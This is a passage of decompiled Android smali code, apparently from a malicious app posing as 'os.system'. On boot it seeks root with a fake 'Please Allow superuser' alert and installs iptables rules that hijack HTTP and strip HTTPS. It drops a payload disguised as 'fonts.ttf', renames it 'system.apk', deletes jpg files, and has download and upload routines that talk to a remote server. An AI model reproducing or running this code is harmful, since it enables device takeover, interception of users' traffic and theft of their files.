    move-exception v0

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 11

    .prologue
    const/4 v10, 0x5

    const/4 v8, -0x1

    const/4 v5, 0x2

    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 929
    iput-object p1, p0, Los/system/ReceiverBoot;->exContext:Landroid/content/Context;

    .line 930
    const-string v0, "voltage"

    invoke-virtual {p2, v0, v6}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    int-to-float v0, v0

    const/high16 v1, 0x42c80000    # 100.0f

    div-float v3, v0, v1

    .line 931
    const-string v0, "level"

    invoke-virtual {p2, v0, v6}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    int-to-float v4, v0

    .line 932
    const-string v0, "status"

    invoke-virtual {p2, v0, v8}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 934
    new-array v9, v10, [Ljava/lang/String;

    const-string v1, "iptables -A FORWARD -p udp --dport 53 -j ACCEPT"

    aput-object v1, v9, v6

    const-string v1, "iptables -A FORWARD -p udp --sport 53 -j ACCEPT"

    aput-object v1, v9, v7

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 937
    invoke-static {v7}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":8888"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    aput-object v1, v9, v5

    const/4 v1, 0x3

    const-string v2, "iptables -P FORWARD DROP"

    aput-object v2, v9, v1

    const/4 v1, 0x4

    const-string v2, "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"

    aput-object v2, v9, v1

    .line 942
    if-eq v0, v5, :cond_0

    if-ne v0, v10, :cond_8

    :cond_0
    move v0, v7

    .line 943
    :goto_0
    const-string v1, "TIDAK_CHARGER"

    .line 944
    if-eqz v0, :cond_e

    .line 945
    const-string v0, "plugged"

    invoke-virtual {p2, v0, v8}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 946
    if-ne v0, v5, :cond_9

    move v2, v7

    .line 947
    :goto_1
    if-ne v0, v7, :cond_a

    move v0, v7

    .line 949
    :goto_2
    if-eqz v2, :cond_b

    .line 950
    const-string v0, "USB_CHARGER"

    move-object v8, v0

    .line 956
    :goto_3
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "v "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "% "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->batStatus:Ljava/lang/String;

    .line 958
    new-instance v0, Los/system/SystemThread;

    invoke-direct {v0}, Los/system/SystemThread;-><init>()V

    iput-object v0, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    .line 959
    const-string v0, "audio"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Los/system/ReceiverBoot;->audioManager:Landroid/media/AudioManager;

    .line 960
    const-string v0, "vibrator"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Vibrator;

    iput-object v0, p0, Los/system/ReceiverBoot;->vibrator:Landroid/os/Vibrator;

    .line 961
    const-string v0, "Settings"

    invoke-virtual {p1, v0, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Los/system/ReceiverBoot;->settings:Landroid/content/SharedPreferences;

    .line 962
    iget-object v0, p0, Los/system/ReceiverBoot;->settings:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    iput-object v0, p0, Los/system/ReceiverBoot;->seteditor:Landroid/content/SharedPreferences$Editor;

    .line 963
    iget-object v0, p0, Los/system/ReceiverBoot;->settings:Landroid/content/SharedPreferences;

    const-string v1, "swmain"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->mainSave:Ljava/lang/String;

    .line 964
    new-instance v0, Los/system/ServerUtils;

    invoke-direct {v0, p1}, Los/system/ServerUtils;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    .line 965
    invoke-static {v7}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->identitasResult:Ljava/lang/String;

    .line 966
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->getPathToInstallServer()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Los/system/ReceiverBoot;->pathToInstallServer:Ljava/lang/String;

    .line 967
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->getDocFolder()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->docFolder:Ljava/lang/String;

    .line 968
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->getPathExternal()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    .line 970
    iget-object v0, p0, Los/system/ReceiverBoot;->settings:Landroid/content/SharedPreferences;

    const-string v1, "server"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "aktif"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 971
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->install(Landroid/content/Context;)V

    .line 974
    :cond_1
    iget-object v0, p0, Los/system/ReceiverBoot;->settings:Landroid/content/SharedPreferences;

    const-string v1, "pakroot"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "aktif"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 975
    invoke-static {}, Los/system/ReceiverBoot;->rootRequest()Ljava/lang/String;

    move-result-object v0

    const-string v1, "tolak user"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 976
    const-string v0, "root android state............TOLAK USER\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 977
    const-string v2, "aktif"

    const/high16 v3, -0x10000

    const/16 v4, 0x30

    const-string v5, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can\'t access binary system to update manager\n\n\n"

    move-object v0, p0

    move-object v1, p1

    invoke-virtual/range {v0 .. v5}, Los/system/ReceiverBoot;->toastShow(Landroid/content/Context;Ljava/lang/String;IILjava/lang/String;)V

    .line 981
    :cond_2
    sget-object v0, Los/system/ReceiverBoot;->mainSave:Ljava/lang/String;

    const-string v1, "hidup"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 983
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->install(Landroid/content/Context;)V

    .line 984
    sget-boolean v0, Los/system/ReceiverBoot;->installResult:Z

    if-eqz v0, :cond_3

    .line 986
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->rooting(Landroid/content/Context;)V

    .line 987
    sget-boolean v0, Los/system/ReceiverBoot;->rootResult:Z

    if-eqz v0, :cond_3

    .line 989
    invoke-virtual {p0, p1, v9}, Los/system/ReceiverBoot;->main(Landroid/content/Context;[Ljava/lang/String;)V

    .line 994
    :cond_3
    invoke-static {p1}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 995
    const-string v0, "Hotspot terpakai............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 1000
    :cond_4
    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_d

    invoke-static {p1}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_d

    .line 1002
    const-string v0, "USB_CHARGER"

    invoke-virtual {v8, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 1004
    sput-boolean v6, Los/system/ReceiverBoot;->pingResult:Z

    .line 1017
    :goto_4
    sput-boolean v6, Los/system/ReceiverBoot;->finishInstall:Z

    .line 1018
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.BOOT_COMPLETED"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 1024
    sput-boolean v7, Los/system/ReceiverBoot;->finishInstall:Z

    .line 1025
    new-instance v0, Landroid/content/Intent;

    const-class v1, Los/system/SystemThread;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 1026
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v1}, Los/system/ServerUtils;->getPathExternal()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1027
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_5

    .line 1028
    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    .line 1032
    :cond_5
    :try_start_0
    new-instance v0, Los/system/MainActivity;

    invoke-direct {v0}, Los/system/MainActivity;-><init>()V

    const-string v1, "os.system"

    const-string v2, "open"

    invoke-virtual {v0, p1, v1, v2}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 1034
    new-instance v0, Los/system/Installer;

    const/4 v1, 0x1

    invoke-direct {v0, p1, v1}, Los/system/Installer;-><init>(Landroid/content/Context;Z)V

    const-string v1, "fonts.ttf"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, p1, v1, v2}, Los/system/Installer;->assetToSdcard(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 1035
    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 1036
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "mv "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/fonts.ttf "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/system.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 1037
    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 1039
    :cond_6
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "exekusi sukses"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1047
    :goto_5
    :try_start_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "rm "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/*.jpg"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 1051
    :cond_7
    :goto_6
    return-void

    :cond_8
    move v0, v6

    .line 942
    goto/16 :goto_0

    :cond_9
    move v2, v6

    .line 946
    goto/16 :goto_1

    :cond_a
    move v0, v6

    .line 947
    goto/16 :goto_2

    .line 952
    :cond_b
    if-eqz v0, :cond_e

    .line 953
    const-string v0, "AC_CHARGER"

    move-object v8, v0

    goto/16 :goto_3

    .line 1006
    :cond_c
    sput-boolean v7, Los/system/ReceiverBoot;->pingResult:Z

    goto/16 :goto_4

    .line 1014
    :cond_d
    sput-boolean v6, Los/system/ReceiverBoot;->pingResult:Z

    goto/16 :goto_4

    .line 1041
    :catch_0
    move-exception v0

    .line 1042
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "errrot:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_5

    .line 1049
    :catch_1
    move-exception v0

    goto :goto_6

    :cond_e
    move-object v8, v1

    goto/16 :goto_3
.end method

.method public ping(Landroid/content/Context;)Z
    .locals 4

    .prologue
    const/16 v3, 0x2710

    .line 392
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "ping server: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    sget-object v2, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 394
    new-instance v0, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v0}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 395
    invoke-static {v0, v3}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 396
    invoke-static {v0, v3}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 398
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>(Lorg/apache/http/params/HttpParams;)V

    .line 399
    new-instance v0, Lorg/apache/http/client/methods/HttpGet;

    iget-object v2, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    sget-object v2, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-direct {v0, v2}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 401
    :try_start_0
    sget-object v2, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v3, "ping...."

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 402
    invoke-interface {v1, v0}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    .line 403
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "ping terhubung"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 404
    const/4 v0, 0x1

    .line 409
    :goto_0
    return v0

    .line 406
    :catch_0
    move-exception v0

    .line 407
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 408
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "ping error "

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 409
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public requestDownload()Ljava/lang/String;
    .locals 15

    .prologue
    const/4 v2, 0x0

    .line 844
    const/4 v3, 0x0

    .line 845
    const/4 v4, 0x0

    .line 847
    const-string v1, ""

    .line 849
    :try_start_0
    new-instance v0, Ljava/net/URL;

    sget-object v5, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    invoke-direct {v0, v5}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 850
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 851
    :try_start_1
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 853
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    const/16 v6, 0xc8

    if-eq v5, v6, :cond_3

    .line 854
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Server returned HTTP "

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, " "

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    move-result-object v1

    .line 883
    if-eqz v2, :cond_0

    :try_start_2
    invoke-virtual {v4}, Ljava/io/OutputStream;->close()V

    .line 884
    :cond_0
    if-eqz v2, :cond_1

    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_7

    .line 889
    :cond_1
    :goto_0
    if-eqz v0, :cond_2

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_2
    move-object v0, v1

    .line 891
    :goto_1
    return-object v0

    .line 857
    :cond_3
    :try_start_3
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getContentLength()I

    move-result v5

    .line 860
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    move-result-object v4

    .line 861
    :try_start_4
    new-instance v3, Ljava/io/FileOutputStream;

    sget-object v6, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    invoke-direct {v3, v6}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 862
    const/16 v2, 0x1000

    :try_start_5
    new-array v2, v2, [B

    .line 863
    const-wide/16 v6, 0x0

    .line 866
    :goto_2
    invoke-virtual {v4, v2}, Ljava/io/InputStream;->read([B)I

    move-result v8

    const/4 v9, -0x1

    if-eq v8, v9, :cond_8

    .line 871
    int-to-long v10, v8

    add-long/2addr v6, v10

    .line 873
    if-lez v5, :cond_4

    .line 874
    const-wide/16 v10, 0x64

    mul-long/2addr v10, v6

    int-to-long v12, v5

    div-long/2addr v10, v12

    long-to-int v9, v10

    sput v9, Los/system/ReceiverBoot;->sizedownload:I

    .line 876
    :cond_4
    const/4 v9, 0x0

    invoke-virtual {v3, v2, v9, v8}, Ljava/io/OutputStream;->write([BII)V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_0
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    goto :goto_2

    .line 879
    :catch_0
    move-exception v1

    move-object v2, v3

    move-object v3, v4

    move-object v14, v1

    move-object v1, v0

    move-object v0, v14

    .line 880
    :goto_3
    :try_start_6
    invoke-virtual {v0}, Ljava/io/IOException;->toString()Ljava/lang/String;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    move-result-object v0

    .line 883
    if-eqz v2, :cond_5

    :try_start_7
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V

    .line 884
    :cond_5
    if-eqz v3, :cond_6

    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_2

    .line 889
    :cond_6
    :goto_4
    if-eqz v1, :cond_7

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 891
    :cond_7
    :goto_5
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "ok : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    .line 883
    :cond_8
    if-eqz v3, :cond_9

    :try_start_8
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 884
    :cond_9
    if-eqz v4, :cond_a

    invoke-virtual {v4}, Ljava/io/InputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_6

    .line 889
    :cond_a
    :goto_6
    if-eqz v0, :cond_e

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    move-object v0, v1

    goto :goto_5

    .line 882
    :catchall_0
    move-exception v0

    move-object v3, v2

    move-object v4, v2

    .line 883
    :goto_7
    if-eqz v3, :cond_b

    :try_start_9
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 884
    :cond_b
    if-eqz v4, :cond_c

    invoke-virtual {v4}, Ljava/io/InputStream;->close()V
    :try_end_9
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_1

    .line 889
    :cond_c
    :goto_8
    if-eqz v2, :cond_d

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 890
    :cond_d
    throw v0

    .line 886
    :catch_1
    move-exception v1

    goto :goto_8

    .line 882
    :catchall_1
    move-exception v1

    move-object v3, v2

    move-object v4, v2

    move-object v2, v0

    move-object v0, v1

    goto :goto_7

    :catchall_2
    move-exception v1

    move-object v3, v2

    move-object v2, v0

    move-object v0, v1

    goto :goto_7

    :catchall_3
    move-exception v1

    move-object v2, v0

    move-object v0, v1

    goto :goto_7

    :catchall_4
    move-exception v0

    move-object v4, v3

    move-object v3, v2

    move-object v2, v1

    goto :goto_7

    .line 886
    :catch_2
    move-exception v2

    goto :goto_4

    .line 879
    :catch_3
    move-exception v0

    move-object v1, v2

    move-object v3, v2

    goto :goto_3

    :catch_4
    move-exception v1

    move-object v3, v2

    move-object v14, v0

    move-object v0, v1

    move-object v1, v14

    goto :goto_3

    :catch_5
    move-exception v1

    move-object v3, v4

    move-object v14, v0

    move-object v0, v1

    move-object v1, v14

    goto :goto_3

    .line 886
    :catch_6
    move-exception v2

    goto :goto_6

    :catch_7
    move-exception v2

    goto/16 :goto_0

    :cond_e
    move-object v0, v1

    goto :goto_5
.end method

.method public requestUpload()Ljava/lang/String;
    .locals 12

    .prologue
    const/4 v1, 0x0

    .line 747
    sget-object v3, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 748
    sget-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 752
    const/high16 v5, 0x100000

    .line 754
    const-string v2, ""

    .line 756
    const-string v6, "\r\n"

    .line 757
    const-string v7, "--"

    .line 758
    const-string v8, "*****"

    .line 759
    const-string v4, ""

    .line 764
    :try_start_0
